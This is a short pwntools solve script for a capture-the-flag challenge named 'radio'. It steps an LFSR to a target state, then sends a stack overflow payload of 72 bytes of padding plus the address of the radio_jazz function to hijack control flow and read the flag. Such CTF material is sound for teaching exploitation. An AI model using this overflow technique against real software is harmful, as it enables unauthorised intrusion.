#!/usr/bin/env python3

from pwn import *

exe = ELF("./radio")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break *do_state_service")
    else:
        r = remote("chall.k1nd4sus.it", 30507)

    return r


def simulate_lfsr(lfsr: int, taps = 3) -> int:
    lfsr = (lfsr >> 1) | (((lfsr >> 3) ^ lfsr ^ (lfsr >> 2) ^ (lfsr >> 5)) & 1) << 15
    lfsr ^= taps
    return lfsr


def main():
    r = conn()

    lfsr = simulate_lfsr(0xd3ad, 1)
    while lfsr != 0xe69e:
        lfsr = simulate_lfsr(lfsr)
        r.sendlineafter(b"next?", b"2")
        r.sendlineafter(b"tune to:", b"666")

    r.sendlineafter(b"to favourites:", b"A" * 72 + p64(exe.sym.radio_jazz))
    flag = r.recvlines(3)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()

